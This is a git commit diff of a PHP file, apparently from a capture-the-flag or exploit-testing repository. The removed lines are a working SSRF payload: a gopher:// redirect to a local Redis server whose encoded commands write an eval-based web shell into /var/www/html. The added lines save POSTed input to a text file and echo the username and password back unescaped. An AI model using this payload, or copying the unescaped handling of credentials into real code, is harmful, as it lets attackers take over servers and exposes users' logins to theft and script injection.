1bd1d0f5dd244b6ec4f29421734e1929126d75ca
ripper-s <ripper-s@ripper-s.com>
2021-05-26 19:28:49 +0800

    add something
    Signed-off-by: ripper-s <ripper-s@ripper-s.com>

--- 1/1.php
+++ 1/1.php
@@ -1,5 +1,16 @@
 <?php
-header("Location: gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2439%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_REQUEST%5B%22shell%22%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0ASKTT1.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A
-");
-?>
 
+$file = '1.txt';
+$user = $_POST['user'];
+
+file_put_contents($file,$user);
+
+
+
+///**
+echo "HELLO!!!  ";
+echo $_POST['user'];
+echo "<br>Your Password is  ";
+echo $_POST['pwd'];
+//*/
+?>
